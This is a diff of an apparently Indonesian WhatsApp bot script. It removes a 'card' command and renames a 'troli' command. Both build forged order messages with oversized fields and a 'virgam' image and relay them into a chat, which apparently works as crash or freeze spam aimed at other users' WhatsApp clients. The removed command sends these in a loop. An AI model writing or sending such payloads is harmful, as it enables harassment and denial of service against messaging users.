@@ -3820,16 +3820,7 @@ if(text.endsWith("@g.us")) {
         }
 }
 break
-case 'card':
-if(!isCreator) return m.reply("Khusus Owner")
-argzi = arg.split("|")
-if (Number(argzi[1]) >= 10) return m.reply('Kebanyakan Delay Wea ku su!')
-if (isNaN(argzi[1])) return m.reply(`harus berupa angka`)
-for (let i = 0; i < argzi[1]; i++){
-njir = await generateWAMessageFromContent(m.chat,{"orderMessage": {"orderId": "150453297177375", "sellerJid": "6285731811079@s.whatsapp.net", "thumbnail": fs.readFileSync('./src/virgam yg ganas.jpeg'), "itemCount": 2022, "status": "INQUIRY", "surface": "CATALOG", "message": `${argzi[0]}`, "orderTitle": "6283144394823@s.whatsapp.net", "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==" }, "totalAmount1000": "Rp 99.99999999999999999999", "totalCurrencyCode": "IDR", "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:m, contextInfo:{}}) 
-	hisoka.relayMessage(m.chat, njir.message, { messageId: njir.key.id,})
-break
-case 'troliv2':
+case 'troli':
 	if(!isCreator) return m.reply("Khusus Owner")
      troli = generateWAMessageFromContent(m.chat,{
 	"orderMessage": {
@@ -3884,6 +3875,7 @@ jpegThumbnail: fs.readFileSync(`./menu1.jpeg`),
 }
 }, contextInfo:{}}) 
 hisoka.relayMessage(m.chat, main.message, { messageId: main.key.id,})
+	}
 	break
 case 'jadikatalog':
 imeg = hisoka.message.imageMessage
